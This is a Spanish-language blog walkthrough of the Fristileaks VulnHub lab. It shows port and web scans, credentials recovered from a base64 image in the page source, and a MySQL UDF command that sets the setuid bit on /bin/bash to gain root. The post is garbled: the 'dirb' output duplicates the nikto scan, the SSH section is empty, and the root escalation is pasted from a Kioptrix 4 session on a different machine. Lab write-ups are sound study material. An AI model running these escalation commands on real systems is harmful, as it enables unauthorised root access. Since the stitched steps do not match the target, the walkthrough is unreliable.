---
layout: post
title: Fristileaks - Walkthrough
date: 2020-02-19 20:44
description: Walkthrough - Fristileaks
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough

---

## **Walkthrough de Fristileaks**
---

## **Links**
[Fristileaks en Vulnhub](https://www.vulnhub.com/entry/fristileaks-13,133/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.123`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 15:46 -03
Nmap scan report for 10.0.0.123
Host is up (0.00012s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 167.42 seconds
```

>**`nmap -A -T4 -p 80 10.0.0.123 -oA Fristileaks`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 15:49 -03
Nmap scan report for 10.0.0.123
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms 10.0.0.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```

### **Protocolo HTTP (80)**
---
>**``nikto -h 10.0.0.123``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-18 15:50:59 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 15:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8701 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-02-18 15:51:11 (GMT-3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
>**``dirb http://10.0.0.111 /usr/share/wordlists/dirb/big.txt``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-18 15:50:59 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 15:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8701 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-02-18 15:51:11 (GMT-3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
---

Entrando a http://10.0.0.123 se presenta una página de home de login:

---

![img]({{ '/assets/images/Fristileaks/login_01.png' | relative_url }}){: .center-image }*(Login)*

---

Teniendo en cuenta el resultado de **Dirb** hay varios directorios no idexables según el [archivo](https://es.wikipedia.org/wiki/Est%C3%A1ndar_de_exclusi%C3%B3n_de_robots) **robots.txt** que fue encontrado en el servidor web. Al entrar a cada uno de esos tres directorios se nos presenta la siguiente imagen:

---

![img]({{ '/assets/images/Fristileaks/robots.png' | relative_url }}){: .center-image }*(Robots.txt)*

---

![img]({{ '/assets/images/Fristileaks/obiwan.png' | relative_url }}){: .center-image }*(These are not the droids...)*

---

Dando a entender que todavía falta un directorio por descubrir, hay que pensarlo un poco (Lo pensé mucho y no me salió) pero cada directorio tiene el nombre de una bebida: **Cola, Beer y Sisi**. Resulta que el nombre de la VM que queremos romper también es una bebida:

---

![img]({{ '/assets/images/Fristileaks/fristi.png' | relative_url }}){: .center-image }*(Quien lo diría, es una bebida)*

---

Entonces si se prueba ingresar a http://10.0.0.123/fristi aparece la siguiente página:

---

![img]({{ '/assets/images/Fristileaks/login_01.png' | relative_url }}){: .center-image }*(Login)*

---

Lo primero que hice fue ver el código fuente y aparecieron dos comentarios que entregaron bastante información:

![img]({{ '/assets/images/Fristileaks/user.png' | relative_url }}){: .center-image }*(Nombre de usuario revelado)*

```console
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
```

Lo que quiere decir con esto es que la imagen de Nelson que se ve en la página no es una referencia a un archivo dentro del file system del servidor web sino que está directamente embebida en el código HTML, previa conversión a base64.


Por otro lado, después del choclo de información que siginifica la imagen codificada den base64 existe el siguiente comentario:

```console
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
```

---

Lo único que tuve que teniendo ese código en la mano fue pegarlo en un archivo, decodificarlo y guardarlo con extensión PNG:

>**``base64 -d password > password.png``**

Y lo siguiente que aparece si abrimos la imágen resultante es el password:


>**``KeKkeKKeKKeKkEkkEk``**

---

![img]({{ '/assets/images/Fristileaks/password.png' | relative_url }}){: .center-image }*(Hermoso password)*

---

Así que tenemos:

 - Usuario: eezeepz
 - Password: KeKkeKKeKKeKkEkkEk

Si pruebo de loguearme con esa credenciales tengo éxito y se presenta la siguiente página de upload:

---

![img]({{ '/assets/images/Fristileaks/upload.png' | relative_url }}){: .center-image }*(Hermoso password)*

---

### **Protocolo SSH**
---


### **Flag**

---

Al final de todo la enumeración no sirvió más que para encontrar que MySQL corre como **root**, me gustaría decir que soy el genio que logró hacer lo que viene a continuación pero no fue más que copy + paste. Los creditos van para:

 - [Abatchy](https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub)
 - [Adam Palmer](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

---

```console
mysql -u root -h localhost

mysql> use mysql;
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod u+s /bin/bash');

mysql> exit
Bye
john@Kioptrix4:~$ ls -a /bin/bash 
/bin/bash
john@Kioptrix4:~$ bash -p
bash-3.2# whoami
root
bash-3.2# cat /root/congrats.txt 
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```

---


